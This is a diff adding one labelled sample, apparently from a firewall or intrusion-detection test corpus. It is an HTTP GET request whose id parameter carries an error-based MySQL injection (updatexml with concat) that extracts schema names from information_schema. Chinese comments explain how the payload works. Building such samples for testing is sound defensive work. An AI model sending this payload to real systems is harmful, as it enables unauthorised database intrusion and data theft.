@@ -1,0 +1,10 @@
+# SQL注入_GET_mysql_报错注入-06506237
+# 基于报错注入,该SQL注入语句的攻击手法是通过注入恶意的SQL代码来执行XML解析错误，从而获取数据库中schema名称的组合。在该sql注入语句中，使用concat函数将特殊字符（0x23表示#号）与通过子查询从信息模式中的schemata表中获取的schema名称组合成一个字符串。updatexml函数中的第一个参数设置为1，表示对XML文档的修改。substr函数指定从连接字符串中提取子串的起始位置和长度，限制了获取的子串长度为32个字符。最后的参数1表示要替换或插入的新值。
+# 攻击目的是尝试从数据库的信息模式（information_schema）中获取所有schema名称的组合，通过执行恶意代码并利用XML解析错误来实现，进而获取敏感信息。
+GET /?id=1%20and%20updatexml%281%2Csubstr%28concat%280x23%2C%28select%20group_concat%28schema_name%29%20from%20information_schema.schemata%29%2C0x23%29%2C1%2C32%29%2C1%29&bid=hd_tag_m8mv24ev HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ev
+RM-PRO-Token: 47b553385abc8b4e40ee1403b314458e
+RM-PRO-Time: 1742808378899
+User-Agent: curl/7.83.1
+
